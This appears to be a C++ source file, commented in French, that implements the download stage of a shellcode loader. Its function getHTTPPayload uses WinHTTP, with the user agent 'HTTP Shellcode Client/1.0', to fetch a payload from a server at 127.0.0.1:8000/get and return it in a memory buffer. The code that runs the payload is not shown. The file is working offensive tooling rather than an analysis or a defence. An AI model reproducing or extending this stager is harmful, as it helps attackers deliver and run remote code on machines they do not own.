#include "HTTPClient.h"
#include <winhttp.h>
#include <iostream>

#pragma comment(lib, "winhttp.lib")

// Fonction pour r�cup�rer un payload via une requ�te HTTP GET
PBYTE getHTTPPayload(DWORD& payloadSize) {

    // �tape 1 : Initialiser une session WinHTTP
    HINTERNET hSession = WinHttpOpen(L"HTTP Shellcode Client/1.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (!hSession) {
        std::cerr << "Erreur : WinHttpOpen a �chou� avec l'erreur : " << GetLastError() << std::endl;
        return nullptr;
    }

    // �tape 2 : Cr�er une connexion � l'h�te (127.0.0.1:8000)
    HINTERNET hConnect = WinHttpConnect(hSession, L"127.0.0.1", 8000, 0);
    if (!hConnect) {
        std::cerr << "Erreur : WinHttpConnect a �chou� avec l'erreur : " << GetLastError() << std::endl;
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    // �tape 3 : Ouvrir une requ�te GET sur le chemin "/get"
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/get",
        nullptr, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);
    if (!hRequest) {
        std::cerr << "Erreur : WinHttpOpenRequest a �chou� avec l'erreur : " << GetLastError() << std::endl;
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    // �tape 4 : Envoyer la requ�te
    BOOL result = WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!result) {
        std::cerr << "Erreur : WinHttpSendRequest a �chou� avec l'erreur : " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    // �tape 5 : Recevoir la r�ponse
    result = WinHttpReceiveResponse(hRequest, nullptr);
    if (!result) {
        std::cerr << "Erreur : WinHttpReceiveResponse a �chou� avec l'erreur : " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    // �tape 6 : V�rifier la taille des donn�es disponibles
    DWORD availableSize = 0;
    if (!WinHttpQueryDataAvailable(hRequest, &availableSize)) {
        std::cerr << "Erreur : WinHttpQueryDataAvailable a �chou� avec l'erreur : " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    // �tape 7 : Allouer de la m�moire pour recevoir les donn�es
    PBYTE buffer = (PBYTE)LocalAlloc(LPTR, availableSize);
    if (!buffer) {
        std::cerr << "Erreur : Allocation m�moire insuffisante." << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    // �tape 8 : Lire les donn�es HTTP dans le buffer
    DWORD bytesRead = 0;
    if (!WinHttpReadData(hRequest, buffer, availableSize, &bytesRead)) {
        std::cerr << "Erreur : WinHttpReadData a �chou� avec l'erreur : " << GetLastError() << std::endl;
        LocalFree(buffer);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    payloadSize = bytesRead;

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}
